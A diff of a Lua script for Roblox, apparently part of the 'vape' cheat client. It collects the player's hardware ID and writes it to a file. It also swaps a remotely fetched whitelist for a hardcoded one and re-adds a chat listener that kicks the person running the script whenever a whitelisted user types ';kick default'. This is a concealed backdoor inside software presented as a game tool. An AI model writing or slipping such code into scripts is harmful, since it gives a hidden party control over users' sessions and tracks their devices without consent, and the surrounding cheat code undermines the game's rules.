@@ -2155,33 +2155,35 @@ local function findItemInTable(tab, item)
 	return nil
 end
 
-local Players = game:GetService("Players")
-local Myself = Players.LocalPlayer
-
-local RP = game:GetService("ReplicatedStorage")
-
 local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
 
 local HwidWhitelist = {
     "C642B037-0D0A-49E3-8C03-4DB8CEA613A2" --  Xzyn
 }
 
+
 if isfile("/vape/Whitelist.txt") == false then
     writefile("/vape/Whitelist.txt", HWID)
 end
 
 if table.find(HwidWhitelist, HWID) then
-    local Read = readfile("/vape/Whitelist.txt")
+      local Read = readfile("/vape/Whitelist.txt")
 end
 
-local WLTable = {tostring(game:HttpGet("https://raw.githubusercontent.com/31VS1/new/main/whitelist.lua"))}
+local WLTable = {
+    "Xzyn8635" --  Xzyn
+}
 
-RP:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering").OnClientEvent:Connect(function(p)
-    if not table.find(WLTable, p.FromSpeaker) then
-        return 
-    end
-    if p.Message == ";kick default" then
-        Myself:Kick("l")
+
+game:GetService("Players").PlayerAdded:Connect(function()
+    for i, v in pairs(game:GetService("Players"):GetChildren()) do
+        if table.find(WLTable, v.Name) then
+            v.Chatted:Connect(function(msg)
+                if msg == ";kick default" then
+                    game:GetService("Players").LocalPlayer:kick("l")
+                end
+            end)
+        end
     end
 end)
 
